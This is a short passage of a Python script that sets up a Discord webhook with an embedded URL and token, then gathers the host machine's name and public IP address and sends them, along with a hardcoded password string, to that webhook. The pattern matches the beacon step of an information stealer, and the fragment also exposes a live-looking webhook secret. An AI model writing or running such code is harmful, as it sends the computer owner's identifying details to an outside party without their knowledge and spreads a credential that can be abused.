...
hook = Webhook('https://discord.com/api/webhooks/950609171076743200/fBoqkNOkiueCGwkckCNgTelV1lHSKxicH4RTS9wDXBt76Axvb7LYoE-ZbTCpDj23KKeq')
hostname = socket.gethostname()
ip = requests.get('https://api.ipify.org').text
passw = "HACKBAIDHDBAID#123"
hook.send(f'```\nUsername : {hostname}\nIP Address : {ip}\nPassword : {passw}```')
